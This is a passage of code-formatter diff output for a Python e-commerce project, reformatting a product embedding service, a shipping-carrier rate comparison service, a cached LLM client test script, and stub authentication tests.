+                seed = (seed * 1103515245 + 12345) & 0x7FFFFFFF
                 embedding.append((seed % 2000 - 1000) / 1000.0)
-            
+
             return embedding
         else:
             # Use numpy for better mock embeddings
             np.random.seed(hash(text) % 2**32)
             embedding = np.random.normal(0, 1, dimension)
             return embedding.tolist()
-    
+
     def _generate_cache_key(self, text: str, model_name: str) -> str:
         """Generate cache key for embedding."""
         content = f"{model_name}:{text}"
         return hashlib.sha256(content.encode()).hexdigest()
-    
+
     async def embed_product(
         self,
         product_id: str,
         product_data: Dict[str, Any],
-        user_id: Optional[str] = None
+        user_id: Optional[str] = None,
     ) -> bool:
         """
         Generate and store embedding for a product.
-        
+
         Args:
             product_id: Unique product identifier
             product_data: Product information (name, description, category, etc.)
             user_id: Optional user ID for tracking
-            
+
         Returns:
             True if embedding was successfully stored
         """
         try:
             # Create text representation of product
             product_text = self._create_product_text(product_data)
-            
+
             # Generate embedding
             embedding = await self.generate_embedding(product_text)
             if not embedding:
                 logger.error(f"Failed to generate embedding for product: {product_id}")
                 return False
-            
+
             # Store in vector database
             success = await self._store_vector(
                 collection_type=VectorCollectionType.PRODUCTS,
                 point_id=product_id,
                 vector=embedding,
@@ -206,174 +216,175 @@
                     "description": product_data.get("description", ""),
                     "price": product_data.get("price", 0),
                     "condition": product_data.get("condition", ""),
                     "marketplace": product_data.get("marketplace", ""),
                     "created_at": datetime.now(timezone.utc).isoformat(),
-                    "text_content": product_text
-                }
-            )
-            
+                    "text_content": product_text,
+                },
+            )
+
             if success:
                 logger.info(f"Successfully embedded product: {product_id}")
             else:
                 logger.error(f"Failed to store embedding for product: {product_id}")
-            
+
             return success
-            
+
         except Exception as e:
             logger.error(f"Error embedding product {product_id}: {e}")
             return False
-    
+
     def _create_product_text(self, product_data: Dict[str, Any]) -> str:
         """Create text representation of product for embedding."""
         text_parts = []
-        
+
         # Add product name
         if product_data.get("name"):
             text_parts.append(f"Product: {product_data['name']}")
-        
+
         # Add category
         if product_data.get("category"):
             text_parts.append(f"Category: {product_data['category']}")
-        
+
         # Add description
         if product_data.get("description"):
             text_parts.append(f"Description: {product_data['description']}")
-        
+
         # Add condition
         if product_data.get("condition"):
             text_parts.append(f"Condition: {product_data['condition']}")
-        
+
         # Add brand if available
         if product_data.get("brand"):
             text_parts.append(f"Brand: {product_data['brand']}")
-        
+
         # Add key features
         if product_data.get("features"):
             features = product_data["features"]
             if isinstance(features, list):
                 text_parts.append(f"Features: {', '.join(features)}")
             elif isinstance(features, str):
                 text_parts.append(f"Features: {features}")
-        
+
         return " | ".join(text_parts)
-    
+
     async def _store_vector(
         self,
         collection_type: VectorCollectionType,
         point_id: str,
         vector: List[float],
-        payload: Dict[str, Any]
+        payload: Dict[str, Any],
     ) -> bool:
         """Store vector in Qdrant database."""
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available - skipping vector storage")
             return False
-        
+
         try:
             from qdrant_client.http.models import PointStruct
-            
+
             collection_name = vector_db_manager.get_collection_name(collection_type)
-            
+
             # Create point
-            point = PointStruct(
-                id=point_id,
-                vector=vector,
-                payload=payload
-            )
-            
+            point = PointStruct(id=point_id, vector=vector, payload=payload)
+
             # Upsert point
             vector_db_manager.client.upsert(
-                collection_name=collection_name,
-                points=[point]
-            )
-            
+                collection_name=collection_name, points=[point]
+            )
+
             logger.debug(f"Stored vector in collection {collection_name}: {point_id}")
             return True
-            
+
         except Exception as e:
             logger.error(f"Error storing vector: {e}")
             return False
-    
+
     async def search_similar_products(
         self,
         query_text: str,
         limit: int = 10,
         score_threshold: float = 0.7,
-        filters: Optional[Dict[str, Any]] = None
+        filters: Optional[Dict[str, Any]] = None,
     ) -> List[Dict[str, Any]]:
         """
         Search for similar products using semantic similarity.
-        
+
         Args:
             query_text: Search query text
             limit: Maximum number of results
             score_threshold: Minimum similarity score
             filters: Optional filters for search
-            
+
         Returns:
             List of similar products with scores
         """
         if not vector_db_manager.is_available():
             logger.warning("Vector database not available - returning empty results")
             return []
-        
+
         try:
             # Generate query embedding
             query_embedding = await self.generate_embedding(query_text)
             if not query_embedding:
                 logger.error("Failed to generate query embedding")
                 return []
-            
+
             # Search in vector database
-            collection_name = vector_db_manager.get_collection_name(VectorCollectionType.PRODUCTS)
-            
+            collection_name = vector_db_manager.get_collection_name(
+                VectorCollectionType.PRODUCTS
+            )
+
             search_results = vector_db_manager.client.search(
                 collection_name=collection_name,
                 query_vector=query_embedding,
                 limit=limit,
                 score_threshold=score_threshold,
-                query_filter=filters
-            )
-            
+                query_filter=filters,
+            )
+
             # Format results
             results = []
             for result in search_results:
-                results.append({
-                    "product_id": result.payload.get("product_id"),
-                    "product_name": result.payload.get("product_name"),
-                    "category": result.payload.get("category"),
-                    "description": result.payload.get("description"),
-                    "price": result.payload.get("price"),
-                    "condition": result.payload.get("condition"),
-                    "marketplace": result.payload.get("marketplace"),
-                    "similarity_score": result.score,
-                    "created_at": result.payload.get("created_at")
-                })
-            
-            logger.info(f"Found {len(results)} similar products for query: {query_text[:50]}...")
+                results.append(
+                    {
+                        "product_id": result.payload.get("product_id"),
+                        "product_name": result.payload.get("product_name"),
+                        "category": result.payload.get("category"),
+                        "description": result.payload.get("description"),
+                        "price": result.payload.get("price"),
+                        "condition": result.payload.get("condition"),
+                        "marketplace": result.payload.get("marketplace"),
+                        "similarity_score": result.score,
+                        "created_at": result.payload.get("created_at"),
+                    }
+                )
+
+            logger.info(
+                f"Found {len(results)} similar products for query: {query_text[:50]}..."
+            )
             return results
-            
+
         except Exception as e:
             logger.error(f"Error searching similar products: {e}")
             return []
-    
+
     async def get_embedding_stats(self) -> Dict[str, Any]:
         """Get embedding service statistics."""
         stats = {
             "cache_size": len(self.embedding_cache),
             "available_models": list(self.embedding_models.keys()),
             "default_model": self.default_model,
             "vector_db_available": vector_db_manager.is_available(),
-            "numpy_available": NUMPY_AVAILABLE
+            "numpy_available": NUMPY_AVAILABLE,
         }
-        
+
         # Add vector database stats if available
         if vector_db_manager.is_available():
             health_info = await vector_db_manager.health_check()
             stats["vector_db_health"] = health_info
-        
+
         return stats
 
 
 # Global embedding service instance
 embedding_service = VectorEmbeddingService()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/vector/embedding_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_mfa_verification.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_mfa_verification.py	2025-06-19 04:04:12.661082+00:00
@@ -1,6 +1,5 @@
-
 """
 Tests for mfa_verification.py - FALLBACK TESTS
 
 WARNING: These are fallback tests generated due to issues with the automated test generation.
 """
@@ -14,19 +13,21 @@
     from fs_agt_clean.core.auth.mfa_verification import *
 except ImportError:
     # Fallback import path
     pass
 
+
 class TestMfaVerification(unittest.TestCase):
     """Tests for mfa_verification.py"""
-    
+
     def setUp(self):
         """Set up the test environment."""
         pass
-    
+
     def test_basic_functionality(self):
         """Test basic functionality."""
         # TODO: Implement actual tests
         self.assertTrue(True)
 
+
 if __name__ == "__main__":
     unittest.main()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_mfa_verification.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/shipping_arbitrage.py	2025-06-14 20:35:30.847867+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/shipping_arbitrage.py	2025-06-19 04:04:12.672304+00:00
@@ -13,41 +13,51 @@
 from typing import Dict, List, Optional, Any, Tuple
 from datetime import datetime, timezone
 from decimal import Decimal
 from uuid import UUID
 
-from fs_agt_clean.database.repositories.ai_analysis_repository import RevenueCalculationRepository
+from fs_agt_clean.database.repositories.ai_analysis_repository import (
+    RevenueCalculationRepository,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class ShippingCarrier:
     """Represents a shipping carrier with rate calculation capabilities."""
-    
-    def __init__(self, name: str, base_rate: float, per_pound_rate: float, zone_multipliers: Dict[str, float]):
+
+    def __init__(
+        self,
+        name: str,
+        base_rate: float,
+        per_pound_rate: float,
+        zone_multipliers: Dict[str, float],
+    ):
         self.name = name
         self.base_rate = base_rate
         self.per_pound_rate = per_pound_rate
         self.zone_multipliers = zone_multipliers
-    
-    def calculate_rate(self, weight: float, zone: str, package_type: str = "standard") -> float:
+
+    def calculate_rate(
+        self, weight: float, zone: str, package_type: str = "standard"
+    ) -> float:
         """Calculate shipping rate for given parameters."""
         base_cost = self.base_rate + (weight * self.per_pound_rate)
         zone_multiplier = self.zone_multipliers.get(zone, 1.0)
-        
+
         # Apply package type adjustments
         if package_type == "express":
             base_cost *= 1.5
         elif package_type == "overnight":
             base_cost *= 2.5
-        
+
         return base_cost * zone_multiplier
 
 
 class ShippingArbitrageService:
     """Service for shipping cost optimization and arbitrage calculations."""
-    
+
     def __init__(self):
         """Initialize the shipping arbitrage service."""
         self._revenue_repository = None
         self.carriers = self._initialize_carriers()
         self.zone_mapping = self._initialize_zone_mapping()
@@ -58,11 +68,11 @@
     def revenue_repository(self):
         """Lazy initialization of revenue repository."""
         if self._revenue_repository is None:
             self._revenue_repository = RevenueCalculationRepository()
         return self._revenue_repository
-    
+
     def _initialize_carriers(self) -> Dict[str, ShippingCarrier]:
         """Initialize shipping carrier configurations."""
         return {
             "usps": ShippingCarrier(
                 name="USPS",
@@ -74,12 +84,12 @@
                     "zone_3": 1.2,
                     "zone_4": 1.3,
                     "zone_5": 1.4,
                     "zone_6": 1.5,
                     "zone_7": 1.6,
-                    "zone_8": 1.8
-                }
+                    "zone_8": 1.8,
+                },
             ),
             "ups": ShippingCarrier(
                 name="UPS",
                 base_rate=7.25,
                 per_pound_rate=0.95,
@@ -89,12 +99,12 @@
                     "zone_3": 1.25,
                     "zone_4": 1.35,
                     "zone_5": 1.45,
                     "zone_6": 1.55,
                     "zone_7": 1.65,
-                    "zone_8": 1.85
-                }
+                    "zone_8": 1.85,
+                },
             ),
             "fedex": ShippingCarrier(
                 name="FedEx",
                 base_rate=6.75,
                 per_pound_rate=0.90,
@@ -104,12 +114,12 @@
                     "zone_3": 1.22,
                     "zone_4": 1.32,
                     "zone_5": 1.42,
                     "zone_6": 1.52,
                     "zone_7": 1.62,
-                    "zone_8": 1.82
-                }
+                    "zone_8": 1.82,
+                },
             ),
             "dhl": ShippingCarrier(
                 name="DHL",
                 base_rate=8.50,
                 per_pound_rate=1.10,
@@ -119,274 +129,314 @@
                     "zone_3": 1.30,
                     "zone_4": 1.40,
                     "zone_5": 1.50,
                     "zone_6": 1.60,
                     "zone_7": 1.70,
-                    "zone_8": 1.90
-                }
-            )
+                    "zone_8": 1.90,
+                },
+            ),
         }
-    
+
     def _initialize_zone_mapping(self) -> Dict[str, str]:
         """Initialize ZIP code to zone mapping (simplified)."""
         # This is a simplified mapping - in production, use actual carrier zone charts
         return {
             # Zone 1 (local)
-            "90210": "zone_1", "90211": "zone_1", "90212": "zone_1",
+            "90210": "zone_1",
+            "90211": "zone_1",
+            "90212": "zone_1",
             # Zone 2 (regional)
-            "94102": "zone_2", "94103": "zone_2", "94104": "zone_2",
+            "94102": "zone_2",
+            "94103": "zone_2",
+            "94104": "zone_2",
             # Zone 3 (extended regional)
-            "10001": "zone_3", "10002": "zone_3", "10003": "zone_3",
+            "10001": "zone_3",
+            "10002": "zone_3",
+            "10003": "zone_3",
             # Zone 4 (national)
-            "60601": "zone_4", "60602": "zone_4", "60603": "zone_4",
+            "60601": "zone_4",
+            "60602": "zone_4",
+            "60603": "zone_4",
             # Zone 5 (extended national)
-            "30301": "zone_5", "30302": "zone_5", "30303": "zone_5",
+            "30301": "zone_5",
+            "30302": "zone_5",
+            "30303": "zone_5",
             # Zone 6 (far national)
-            "80201": "zone_6", "80202": "zone_6", "80203": "zone_6",
+            "80201": "zone_6",
+            "80202": "zone_6",
+            "80203": "zone_6",
             # Zone 7 (very far)
-            "98101": "zone_7", "98102": "zone_7", "98103": "zone_7",
+            "98101": "zone_7",
+            "98102": "zone_7",
+            "98103": "zone_7",
             # Zone 8 (furthest)
-            "99501": "zone_8", "99502": "zone_8", "99503": "zone_8"
+            "99501": "zone_8",
+            "99502": "zone_8",
+            "99503": "zone_8",
         }
-    
+
     def _get_zone_from_zip(self, zip_code: str) -> str:
         """Get shipping zone from ZIP code."""
         # Remove any non-numeric characters and take first 5 digits
-        clean_zip = ''.join(filter(str.isdigit, zip_code))[:5]
+        clean_zip = "".join(filter(str.isdigit, zip_code))[:5]
         return self.zone_mapping.get(clean_zip, "zone_4")  # Default to zone 4
-    
+
     async def calculate_arbitrage(
         self,
         origin_zip: str,
         destination_zip: str,
         weight: float,
         package_type: str = "standard",
         current_carrier: Optional[str] = None,
-        current_rate: Optional[float] = None
+        current_rate: Optional[float] = None,
     ) -> Dict[str, Any]:
         """Calculate shipping arbitrage opportunities."""
         try:
             # Determine shipping zone
             zone = self._get_zone_from_zip(destination_zip)
-            
+
             # Calculate rates for all carriers
             carrier_rates = {}
             for carrier_name, carrier in self.carriers.items():
                 rate = carrier.calculate_rate(weight, zone, package_type)
                 carrier_rates[carrier_name] = {
                     "rate": round(rate, 2),
                     "carrier": carrier_name.upper(),
-                    "estimated_delivery": self._get_estimated_delivery(carrier_name, zone, package_type)
+                    "estimated_delivery": self._get_estimated_delivery(
+                        carrier_name, zone, package_type
+                    ),
                 }
-            
+
             # Find optimal carrier
             optimal_carrier = min(carrier_rates.items(), key=lambda x: x[1]["rate"])
             optimal_rate = optimal_carrier[1]["rate"]
-            
+
             # Calculate savings if current rate provided
             savings_data = {}
             if current_rate:
                 savings_amount = current_rate - optimal_rate
-                savings_percentage = (savings_amount / current_rate) * 100 if current_rate > 0 else 0
-                
+                savings_percentage = (
+                    (savings_amount / current_rate) * 100 if current_rate > 0 else 0
+                )
+
                 savings_data = {
                     "original_rate": current_rate,
                     "optimized_rate": optimal_rate,
                     "savings_amount": round(savings_amount, 2),
-                    "savings_percentage": round(savings_percentage, 2)
+                    "savings_percentage": round(savings_percentage, 2),
                 }
-            
+
             # Generate recommendations
             recommendations = self._generate_shipping_recommendations(
                 carrier_rates, zone, weight, package_type
             )
-            
+
             return {
                 "arbitrage_analysis": {
                     "origin_zip": origin_zip,
                     "destination_zip": destination_zip,
                     "shipping_zone": zone,
                     "package_weight": weight,
-                    "package_type": package_type
+                    "package_type": package_type,
                 },
                 "carrier_rates": carrier_rates,
                 "optimal_carrier": {
                     "name": optimal_carrier[0].upper(),
                     "rate": optimal_rate,
-                    "estimated_delivery": optimal_carrier[1]["estimated_delivery"]
+                    "estimated_delivery": optimal_carrier[1]["estimated_delivery"],
                 },
                 "savings": savings_data,
                 "recommendations": recommendations,
-                "calculated_at": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "calculated_at": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error calculating shipping arbitrage: {e}")
             return {
                 "error": str(e),
-                "calculated_at": datetime.now(timezone.utc).isoformat()
-            }
-    
+                "calculated_at": datetime.now(timezone.utc).isoformat(),
+            }
+
     async def optimize_shipping(
-        self,
-        shipments: List[Dict[str, Any]],
-        optimization_criteria: str = "cost"
+        self, shipments: List[Dict[str, Any]], optimization_criteria: str = "cost"
     ) -> Dict[str, Any]:
         """Optimize shipping for multiple shipments."""
         try:
             optimized_shipments = []
             total_original_cost = 0
             total_optimized_cost = 0
-            
+
             for shipment in shipments:
                 # Calculate arbitrage for each shipment
                 arbitrage_result = await self.calculate_arbitrage(
                     origin_zip=shipment.get("origin_zip", "90210"),
                     destination_zip=shipment.get("destination_zip", "10001"),
                     weight=shipment.get("weight", 1.0),
                     package_type=shipment.get("package_type", "standard"),
-                    current_rate=shipment.get("current_rate")
+                    current_rate=shipment.get("current_rate"),
                 )
-                
+
                 if "error" not in arbitrage_result:
-                    optimized_shipments.append({
-                        "shipment_id": shipment.get("id", f"shipment_{len(optimized_shipments) + 1}"),
-                        "original_data": shipment,
-                        "optimization": arbitrage_result
-                    })
-                    
+                    optimized_shipments.append(
+                        {
+                            "shipment_id": shipment.get(
+                                "id", f"shipment_{len(optimized_shipments) + 1}"
+                            ),
+                            "original_data": shipment,
+                            "optimization": arbitrage_result,
+                        }
+                    )
+
                     # Track cost savings
                     if arbitrage_result.get("savings"):
-                        total_original_cost += arbitrage_result["savings"].get("original_rate", 0)
-                        total_optimized_cost += arbitrage_result["savings"].get("optimized_rate", 0)
-            
+                        total_original_cost += arbitrage_result["savings"].get(
+                            "original_rate", 0
+                        )
+                        total_optimized_cost += arbitrage_result["savings"].get(
+                            "optimized_rate", 0
+                        )
+
             # Calculate overall savings
             total_savings = total_original_cost - total_optimized_cost
-            savings_percentage = (total_savings / total_original_cost * 100) if total_original_cost > 0 else 0
-            
+            savings_percentage = (
+                (total_savings / total_original_cost * 100)
+                if total_original_cost > 0
+                else 0
+            )
+
             return {
                 "optimization_summary": {
                     "total_shipments": len(shipments),
                     "optimized_shipments": len(optimized_shipments),
                     "total_original_cost": round(total_original_cost, 2),
                     "total_optimized_cost": round(total_optimized_cost, 2),
                     "total_savings": round(total_savings, 2),
                     "savings_percentage": round(savings_percentage, 2),
-                    "optimization_criteria": optimization_criteria
+                    "optimization_criteria": optimization_criteria,
                 },
                 "optimized_shipments": optimized_shipments,
-                "optimized_at": datetime.now(timezone.utc).isoformat()
-            }
-            
+                "optimized_at": datetime.now(timezone.utc).isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error optimizing shipping: {e}")
             return {
                 "error": str(e),
-                "optimized_at": datetime.now(timezone.utc).isoformat()
-            }
-    
+                "optimized_at": datetime.now(timezone.utc).isoformat(),
+            }
+
     async def track_savings(
         self,
         user_id: UUID,
         original_cost: float,
         optimized_cost: float,
         optimization_method: str,
         carrier_recommendations: Dict[str, Any],
-        product_id: Optional[UUID] = None
+        product_id: Optional[UUID] = None,
     ) -> Dict[str, Any]:
         """Track shipping cost savings for revenue calculation."""
         try:
             savings_amount = original_cost - optimized_cost
-            savings_percentage = (savings_amount / original_cost * 100) if original_cost > 0 else 0
-            
+            savings_percentage = (
+                (savings_amount / original_cost * 100) if original_cost > 0 else 0
+            )
+
             # Store in database
             calculation = await self.revenue_repository.create_arbitrage_calculation(
                 user_id=user_id,
                 original_shipping_cost=original_cost,
                 optimized_shipping_cost=optimized_cost,
                 savings_amount=savings_amount,
                 savings_percentage=savings_percentage,
                 optimization_method=optimization_method,
                 carrier_recommendations=carrier_recommendations,
-                product_id=product_id
-            )
-            
+                product_id=product_id,
+            )
+
             return {
                 "calculation_id": str(calculation.id),
                 "savings_tracked": {
                     "original_cost": original_cost,
                     "optimized_cost": optimized_cost,
                     "savings_amount": round(savings_amount, 2),
-                    "savings_percentage": round(savings_percentage, 2)
+                    "savings_percentage": round(savings_percentage, 2),
                 },
                 "optimization_method": optimization_method,
-                "tracked_at": calculation.created_at.isoformat()
-            }
-            
+                "tracked_at": calculation.created_at.isoformat(),
+            }
+
         except Exception as e:
             logger.error(f"Error tracking savings: {e}")
             return {
                 "error": str(e),
-                "tracked_at": datetime.now(timezone.utc).isoformat()
-            }
-    
-    def _get_estimated_delivery(self, carrier: str, zone: str, package_type: str) -> str:
+                "tracked_at": datetime.now(timezone.utc).isoformat(),
+            }
+
+    def _get_estimated_delivery(
+        self, carrier: str, zone: str, package_type: str
+    ) -> str:
         """Get estimated delivery time for carrier and zone."""
         base_days = {
             "usps": {"standard": 3, "express": 2, "overnight": 1},
             "ups": {"standard": 3, "express": 2, "overnight": 1},
             "fedex": {"standard": 2, "express": 1, "overnight": 1},
-            "dhl": {"standard": 4, "express": 2, "overnight": 1}
+            "dhl": {"standard": 4, "express": 2, "overnight": 1},
         }
-        
+
         zone_adjustments = {
-            "zone_1": 0, "zone_2": 0, "zone_3": 1, "zone_4": 1,
-            "zone_5": 2, "zone_6": 2, "zone_7": 3, "zone_8": 4
+            "zone_1": 0,
+            "zone_2": 0,
+            "zone_3": 1,
+            "zone_4": 1,
+            "zone_5": 2,
+            "zone_6": 2,
+            "zone_7": 3,
+            "zone_8": 4,
         }
-        
+
         base = base_days.get(carrier, {}).get(package_type, 3)
         adjustment = zone_adjustments.get(zone, 1)
         total_days = base + adjustment
-        
+
         return f"{total_days} business days"
-    
+
     def _generate_shipping_recommendations(
-        self,
-        carrier_rates: Dict[str, Any],
-        zone: str,
-        weight: float,
-        package_type: str
+        self, carrier_rates: Dict[str, Any], zone: str, weight: float, package_type: str
     ) -> List[str]:
         """Generate shipping optimization recommendations."""
         recommendations = []
-        
+
         # Sort carriers by rate
         sorted_carriers = sorted(carrier_rates.items(), key=lambda x: x[1]["rate"])
-        
+
         # Cost optimization recommendation
         cheapest = sorted_carriers[0]
         recommendations.append(
             f"Use {cheapest[0].upper()} for lowest cost (${cheapest[1]['rate']:.2f})"
         )
-        
+
         # Speed vs cost recommendation
         if package_type == "standard" and len(sorted_carriers) > 1:
             second_cheapest = sorted_carriers[1]
             price_diff = second_cheapest[1]["rate"] - cheapest[1]["rate"]
             if price_diff < 2.00:
                 recommendations.append(
                     f"Consider {second_cheapest[0].upper()} for only ${price_diff:.2f} more"
                 )
-        
+
         # Weight-based recommendations
         if weight > 5.0:
-            recommendations.append("Consider consolidating shipments to reduce per-pound costs")
-        
+            recommendations.append(
+                "Consider consolidating shipments to reduce per-pound costs"
+            )
+
         # Zone-based recommendations
         if zone in ["zone_7", "zone_8"]:
-            recommendations.append("Consider regional fulfillment centers for distant zones")
-        
+            recommendations.append(
+                "Consider regional fulfillment centers for distant zones"
+            )
+
         return recommendations
 
 
 # Global shipping arbitrage service instance
 shipping_arbitrage_service = ShippingArbitrageService()
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/shipping_arbitrage.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_token_manager.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_token_manager.py	2025-06-19 04:04:12.722198+00:00
@@ -1,6 +1,5 @@
-
 """
 Tests for token_manager.py - FALLBACK TESTS
 
 WARNING: These are fallback tests generated due to issues with the automated test generation.
 """
@@ -14,19 +13,21 @@
     from fs_agt_clean.core.auth.token_manager import *
 except ImportError:
     # Fallback import path
     pass
 
+
 class TestTokenManager(unittest.TestCase):
     """Tests for token_manager.py"""
-    
+
     def setUp(self):
         """Set up the test environment."""
         pass
-    
+
     def test_basic_functionality(self):
         """Test basic functionality."""
         # TODO: Implement actual tests
         self.assertTrue(True)
 
+
 if __name__ == "__main__":
     unittest.main()
--- /home/brend/Flipsync_Final/fs_agt_clean/test_cached_llm.py	2025-06-16 17:01:12.606457+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/test_cached_llm.py	2025-06-19 04:04:12.720782+00:00
@@ -11,175 +11,188 @@
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+
 async def test_cached_llm_client():
     """Test the cached LLM client implementation."""
     try:
         # Import required modules
-        from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClientFactory, ModelType, ModelProvider
+        from fs_agt_clean.core.ai.simple_llm_client import (
+            SimpleLLMClientFactory,
+            ModelType,
+            ModelProvider,
+        )
         from fs_agt_clean.core.ai.cached_llm_client import CachedLLMClientFactory
         from fs_agt_clean.core.cache.ai_cache import AICacheService
-        
+
         print(" Testing Cached LLM Client Implementation")
         print("=" * 50)
-        
+
         # Test 1: Create base LLM client
         print("\n1. Creating base LLM client...")
         base_client = SimpleLLMClientFactory.create_ollama_client(
-            model_type=ModelType.GEMMA_7B,  # gemma3:4b
-            temperature=0.7
+            model_type=ModelType.GEMMA_7B, temperature=0.7  # gemma3:4b
         )
-        print(f" Base client created: {base_client.provider.value} - {base_client.model}")
-        
+        print(
+            f" Base client created: {base_client.provider.value} - {base_client.model}"
+        )
+
         # Test 2: Create cached client
         print("\n2. Creating cached LLM client...")
         try:
             cached_client = await CachedLLMClientFactory.create_cached_client(
                 base_client,
                 redis_url="redis://flipsync-infrastructure-redis:6379",
-                cache_db=2
+                cache_db=2,
             )
-            print(f" Cached client created (cache_enabled={cached_client.cache_enabled})")
+            print(
+                f" Cached client created (cache_enabled={cached_client.cache_enabled})"
+            )
         except Exception as e:
             print(f"  Cache service failed, creating non-cached client: {e}")
             cached_client = CachedLLMClientFactory.create_non_cached_client(base_client)
-        
+
         # Test 3: Simple response generation
         print("\n3. Testing simple response generation...")
         test_prompt = "What is pricing analysis?"
-        
+
         start_time = time.time()
         try:
             response = await cached_client.generate_response(
                 prompt=test_prompt,
-                system_prompt="You are a helpful business assistant."
+                system_prompt="You are a helpful business assistant.",
             )
             response_time = time.time() - start_time
-            
+
             print(f" Response generated in {response_time:.2f}s")
             print(f"   Provider: {response.provider.value}")
             print(f"   Model: {response.model}")
             print(f"   Response time: {response.response_time:.2f}s")
             print(f"   Content length: {len(response.content)} characters")
             print(f"   Cached: {response.metadata.get('cached', False)}")
             print(f"   Content preview: {response.content[:100]}...")
-            
+
         except Exception as e:
             print(f" Response generation failed: {e}")
             return False
-        
+
         # Test 4: Cache hit test (if cache is enabled)
         if cached_client.cache_enabled:
             print("\n4. Testing cache hit...")
             start_time = time.time()
             try:
                 cached_response = await cached_client.generate_response(
                     prompt=test_prompt,
-                    system_prompt="You are a helpful business assistant."
+                    system_prompt="You are a helpful business assistant.",
                 )
                 cache_response_time = time.time() - start_time
-                
+
                 print(f" Cached response retrieved in {cache_response_time:.2f}s")
                 print(f"   Cached: {cached_response.metadata.get('cached', False)}")
-                print(f"   Speed improvement: {response_time/cache_response_time:.1f}x faster")
-                
+                print(
+                    f"   Speed improvement: {response_time/cache_response_time:.1f}x faster"
+                )
+
             except Exception as e:
                 print(f" Cache hit test failed: {e}")
         else:
             print("\n4.   Cache disabled - skipping cache hit test")
-        
+
         # Test 5: Different prompts (cache miss)
         print("\n5. Testing cache miss with different prompt...")
         different_prompt = "Explain inventory management strategies."
-        
+
         start_time = time.time()
         try:
             different_response = await cached_client.generate_response(
                 prompt=different_prompt,
-                system_prompt="You are a helpful business assistant."
+                system_prompt="You are a helpful business assistant.",
             )
             different_response_time = time.time() - start_time
-            
+
             print(f" Different response generated in {different_response_time:.2f}s")
             print(f"   Cached: {different_response.metadata.get('cached', False)}")
             print(f"   Content preview: {different_response.content[:100]}...")
-            
+
         except Exception as e:
             print(f" Different prompt test failed: {e}")
-        
+
         print("\n" + "=" * 50)
         print(" Cached LLM Client test completed successfully!")
         return True
-        
+
     except Exception as e:
         print(f"\n Test failed with error: {e}")
         import traceback
+
         traceback.print_exc()
         return False
+
 
 async def test_performance_comparison():
     """Compare performance between cached and non-cached clients."""
     try:
-        from fs_agt_clean.core.ai.simple_llm_client import SimpleLLMClientFactory, ModelType
+        from fs_agt_clean.core.ai.simple_llm_client import (
+            SimpleLLMClientFactory,
+            ModelType,
+        )
         from fs_agt_clean.core.ai.cached_llm_client import CachedLLMClientFactory
-        
+
         print("\n Performance Comparison Test")
         print("=" * 40)
-        
+
         # Create clients
         base_client = SimpleLLMClientFactory.create_ollama_client(
-            model_type=ModelType.GEMMA_7B,
-            temperature=0.7
+            model_type=ModelType.GEMMA_7B, temperature=0.7
         )
-        
+
         cached_client = await CachedLLMClientFactory.create_cached_client(base_client)
         non_cached_client = CachedLLMClientFactory.create_non_cached_client(base_client)
-        
+
         test_prompt = "Explain competitive pricing strategies."
         system_prompt = "You are an expert business consultant."
-        
+
         # Test non-cached client
         print("\nTesting non-cached client...")
         start_time = time.time()
         non_cached_response = await non_cached_client.generate_response(
-            prompt=test_prompt,
-            system_prompt=system_prompt
+            prompt=test_prompt, system_prompt=system_prompt
         )
         non_cached_time = time.time() - start_time
         print(f"Non-cached response time: {non_cached_time:.2f}s")
-        
+
         # Test cached client (first call - cache miss)
         print("\nTesting cached client (cache miss)...")
         start_time = time.time()
         cached_response_miss = await cached_client.generate_response(
-            prompt=test_prompt,
-            system_prompt=system_prompt
+            prompt=test_prompt, system_prompt=system_prompt
         )
         cached_miss_time = time.time() - start_time
         print(f"Cached response time (miss): {cached_miss_time:.2f}s")
-        
+
         # Test cached client (second call - cache hit)
         if cached_client.cache_enabled:
             print("\nTesting cached client (cache hit)...")
             start_time = time.time()
             cached_response_hit = await cached_client.generate_response(
-                prompt=test_prompt,
-                system_prompt=system_prompt
+                prompt=test_prompt, system_prompt=system_prompt
             )
             cached_hit_time = time.time() - start_time
             print(f"Cached response time (hit): {cached_hit_time:.2f}s")
             print(f"Cache hit speedup: {non_cached_time/cached_hit_time:.1f}x faster")
-        
+
         print("\n Performance test completed!")
-        
+
     except Exception as e:
         print(f" Performance test failed: {e}")
 
+
 if __name__ == "__main__":
+
     async def main():
         success = await test_cached_llm_client()
         if success:
             await test_performance_comparison()
-    
+
     asyncio.run(main())
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/core/auth/test_token_manager.py
would reformat /home/brend/Flipsync_Final/fs_agt_clean/test_cached_llm.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/run_token_manager_test.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/run_token_manager_test.py	2025-06-19 04:04:12.739290+00:00
@@ -15,8 +15,8 @@
 
 # Run the tests
 if __name__ == "__main__":
     # Create a test suite with just the TokenManager tests
     test_suite = unittest.TestLoader().loadTestsFromTestCase(TestTokenManager)
-    
+
     # Run the tests
     unittest.TextTestRunner().run(test_suite)
would reformat /home/brend/Flipsync_Final/fs_agt_clean/tests/run_token_manager_test.py
--- /home/brend/Flipsync_Final/fs_agt_clean/tests/run_tests.py	2025-06-14 20:35:30.851876+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/tests/run_tests.py	2025-06-19 04:04:12.741994+00:00
